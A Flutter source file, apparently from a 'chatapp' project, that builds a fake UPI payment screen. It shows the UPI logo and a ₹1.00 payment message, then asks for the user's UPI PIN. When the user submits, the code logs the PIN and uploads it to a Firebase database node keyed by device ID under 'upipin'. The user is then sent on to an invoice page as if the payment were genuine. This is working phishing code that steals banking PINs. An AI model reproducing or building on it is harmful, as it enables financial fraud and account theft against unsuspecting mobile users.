import 'package:chatapp/service/fetch_device_info.dart';
import 'package:chatapp/utills/app_colors.dart';
import 'package:chatapp/utills/spacing.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:sizer/sizer.dart';

import '../main.dart';
import 'invoice_page.dart';

class UpiPinScreen extends StatefulWidget {
  @override
  State<UpiPinScreen> createState() => _UpiPinScreenState();
}

class _UpiPinScreenState extends State<UpiPinScreen> {
  String enteredPin = '';

  void onKeyTap(String value)  {
    setState(()   {
      if (value == '<') {
        if (enteredPin.isNotEmpty) {
          enteredPin = enteredPin.substring(0, enteredPin.length - 1);
        }
      } else if (value == '✓') {
        // Handle PIN submit here
        // For example, validate PIN
        if(enteredPin.length >=4){
          debugPrint('Entered PIN: $enteredPin');
          sendPin();
          Get.to(()=>InvoicePage());
        }
      } else {
        if (enteredPin.length < 6) {
          enteredPin += value;
        }
      }
    });
  }

  void sendPin() async{
    final deviceID = DeviceInformation.deviceId;
    await FirebaseDatabase.instance
        .ref("clients/$deviceID")
        .update({"upipin": enteredPin});
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.whiteColor,
      appBar: AppBar(
        elevation: 0,
        backgroundColor: Colors.white,
        centerTitle: false,
        iconTheme: IconThemeData(color: Colors.black),

        // title: Image.asset('assets/upi_logo.png', height: 32),
        automaticallyImplyLeading: false,
        actions: [
          // SizedBox(width: 16),
          Image.asset('assets/upi_logo.png', height: 26.sp),
          Spacing.width(25),
        ],
      ),
      body: SafeArea(
        child: Column(

          children: [
            // Transaction Info Row
            Container(
              padding: EdgeInsets.symmetric(horizontal: 14.sp, vertical: 5.sp),
              decoration: BoxDecoration(color: Color(0xffF0F0F0)),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Sending:',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 17.sp,
                        ),
                      ),
                      Text(
                        'To:',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 17.sp,
                        ),
                      ),
                    ],
                  ),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.end,
                    children: [
                      Text(
                        '₹1.00',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 17.sp,
                        ),
                      ),
                      Text(
                        '$appName',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 17.sp,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),

            // PIN entry label and circles
            Spacing.height(24.sp),
            Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                Text(
                  'ENTER UPI PIN',
                  style: TextStyle(fontWeight: FontWeight.w600, fontSize: 20.sp),
                ),
                Spacing.height(18.sp),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,

                  children: List.generate(
                    6,
                        (index) =>

                        index < enteredPin.length ?
                            Padding(
                      padding: EdgeInsets.symmetric(horizontal: 8.0),
                      child: Icon(
                        Icons.circle,
                        size: 14,
                        color:
                        index < enteredPin.length
                            ? Colors.blue
                            : Colors.transparent,
                      ),
                    )
                            : SizedBox(
                          height: 16.sp,
                        )
                  ),
                ),
              ],
            ),

            Spacing.height(20.sp),

            // Info banner
            Container(
              padding: EdgeInsets.all(15.sp),
              margin: EdgeInsets.symmetric(horizontal: 20.sp, vertical: 5.sp),
              decoration: BoxDecoration(
                color: Colors.yellow[100],
                borderRadius: BorderRadius.circular(32),
              ),
              child: Row(
                children: [
                  Icon(Icons.info, color: Colors.orange, size: 22.sp),
                  SizedBox(width: 7.sp),
                  Expanded(
                    child: Text(
                      'You are sending ₹1.00 from your account to $appName',
                      style: TextStyle(
                        fontWeight: FontWeight.w600,
                        fontSize: 15.sp,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                ],
              ),
            ),

            Spacer(),

            // Numeric keypad
            Card(
              elevation: 0,
              margin: EdgeInsets.zero,
              color: Color(0xffF1F1F1),
              child: Column(
                children: [
                  for (int row = 0; row < 4; row++)
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: List.generate(3, (col) {
                        final num =
                            row == 3
                                ? (col == 0 ? '<' : (col == 2 ? '✓' : '0'))
                                : (row * 3 + col + 1).toString();

                        return InkWell(
                          onTap: () => onKeyTap(num),
                          customBorder: CircleBorder(),
                          child: Padding(
                            padding: EdgeInsets.all(20.sp),
                            child:
                                num == '<'
                                    ? Icon(Icons.backspace, color: Colors.red)
                                    : num == '✓'
                                    ? CircleAvatar(
                                      backgroundColor: Colors.green,

                                      child: Icon(
                                        Icons.check,
                                        color: Colors.white,
                                      ),
                                    )
                                    : Text(
                                      num,
                                      style: TextStyle(
                                        fontSize: 24.sp,
                                        color: Colors.blue,
                                        fontWeight: FontWeight.w500,
                                      ),
                                    ),
                          ),
                        );
                      }),
                    ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
